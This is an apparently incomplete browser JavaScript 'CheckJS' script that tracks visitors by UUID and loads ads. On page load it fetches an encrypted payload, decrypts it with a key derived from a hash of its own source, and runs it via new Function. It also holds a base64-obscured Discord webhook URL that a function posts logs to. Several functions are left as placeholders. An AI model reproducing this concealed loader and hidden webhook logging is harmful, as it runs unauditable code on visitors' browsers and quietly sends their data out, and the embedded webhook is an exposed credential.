(function() {
    "use strict";

    const CheckJS = {
        CONFIG: {
            AD_SCRIPT_URL: 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6151036058675874',
            ERROR_URL: 'https://search3958.github.io/usercheck/aderror.html',
            ENTRY_URL: 'https://search3958.github.io/usercheck/entry.html',
            CRYPTO_FILE: './main-crypto.txt',
            FETCH_TIMEOUT: 8000,
            BLACKLIST_UUIDS: ['00000000-0000-0000-0000-000000000000', 'ffffffff-ffff-ffff-ffff-ffffffffffff', '9fd3c325-1cb9-4072-9575-e320f23203b4'],
            TARGET_UUID: ['ef91fb3b-a59b-49e1-83d1-125a587dcedd'],
            W_H: "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1NjYwNzc3MTEyNTYxMjYzMi8xNXdlV3hlSXVhWGI1cERNOFJ3WVIyM2ZxYUpjVGp2WmlrTmxkcEpwZDIwUFd2aE9jcmRmWHYxdi1lTm5XUkNNSWlYaA==",
            BYPASS_HASHES: ["48fa3114175952b571518fbd5472723879c998474030a7e2387bcf3851cefcbe521f7e3176bde2f247ef729f0503901fa5f4a728429db0b7f291112bfa03dc8b", "68f7d5b640628f06ca057f9f10062d3ba561faca615ed43eeca831c4796ed66374674add2d5dd8a4eef3f6cfc50f63025415d0cb71db8b443b159fd4ce8df8b0", "b9a578c47f1629078f794c332febee06ef07c1f26365518dd8762f59dec6c547ccf468b5575b4da6d30d56c73bda0a5cddea028fd7cfec6bcfa69c18a37b8d9d", "8ff868a14d3b1a4f2d7d2156796ce8c0edcbe910c1b55687c388ef10e41fec033327166800f6cb3ea1a3bcba35285416b6f9d1d71817cd2a9dae78820ce3a31f", "a5473179707738184b3ca4461e6ca0201da2da8f50e139190d4d82652b947aff79c99a6330be9808244dfb6880b5b566f44283a48628fac813ff321756716151"]
        },

        crc32(str) {
            let table = [];
            for (let i = 0; i < 256; i++) {
                let c = i;
                for (let j = 0; j < 8; j++) c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
                table[i] = c;
            }
            let crc = -1;
            for (let i = 0; i < str.length; i++) {
                crc = (crc >>> 8) ^ table[(crc ^ str.charCodeAt(i)) & 0xFF];
            }
            return ((crc ^ -1) >>> 0).toString(16);
        },

        async decryptAndRun() {
            let currentHash = "unknown";
            try {
                const selfRes = await fetch(document.currentScript.src);
                const selfCode = await selfRes.text();
                currentHash = this.crc32(selfCode);

                const cryptoRes = await fetch(this.CONFIG.CRYPTO_FILE);
                const b64Data = await cryptoRes.text();

                const raw = Uint8Array.from(atob(b64Data), c => c.charCodeAt(0));
                const iv = raw.slice(0, 12);
                const cipher = raw.slice(12);
                
                // CRC32ハッシュをパスワードとして使用
                const pwHash = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(currentHash));
                const key = await crypto.subtle.importKey('raw', pwHash, 'AES-GCM', false, ['decrypt']);
                
                const decrypted = await crypto.subtle.decrypt({ name: 'AES-GCM', iv: iv }, key, cipher);
                const scriptText = new TextDecoder().decode(decrypted);

                new Function(scriptText)();
                console.log(`✅🔐 Decrypted with hash: ${currentHash}`);
                return true;
            } catch (e) {
                // エラー時に現在のハッシュを明示的に出す
                console.error(`✅🛑 Decryption failed. (Current Hash: ${currentHash})`, e);
                return false;
            }
        },

        async init() {
            await this.decryptAndRun();
            // ... (以下、既存のUUIDチェックなどは同じ)
            console.log("✅🟢 CheckJS-プロセスを開始します。");
            // ... 省略 ...
        },
        
        // (その他必要な関数は元のまま含めてください)
        generateUUID() { try { return crypto.randomUUID(); } catch { return ([1e7]+-1e3+-4e3+-8e2+-1e11).replace(/[018]/g, c => (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)); } },
        async sendLog(status, uuid, userA) { /* ... */ },
        async sendToWebhook(url, content) { try { await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content }), keepalive: true }); } catch (e) {} },
        async computeSHA512(t) { const b = await crypto.subtle.digest('SHA-512', new TextEncoder().encode(t)); return Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2, '0')).join(''); }
    };

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => CheckJS.init());
    } else {
        CheckJS.init();
    }
})();